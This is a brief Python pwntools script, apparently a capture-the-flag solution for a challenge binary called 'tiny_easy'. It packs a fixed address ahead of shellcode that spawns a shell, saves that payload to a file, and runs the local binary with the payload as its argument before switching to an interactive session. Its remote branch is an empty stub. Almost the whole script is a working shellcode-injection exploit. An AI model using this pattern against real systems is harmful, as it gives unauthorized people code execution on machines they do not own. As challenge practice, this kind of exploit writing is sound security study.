#!/usr/bin/env python3 
from pwn import * 

context.binary = elf = ELF('./tiny_easy')
context.log_level = 'DEBUG'

payload = flat( p32(0x8048054), 
           asm(shellcraft.sh()))

with open('solve.txt', 'wb') as file: 
    file.write(payload)

    

if args['REMOTE']:
    pass
else: 
    io = process(executable=elf.path, argv=[payload])


io.interactive()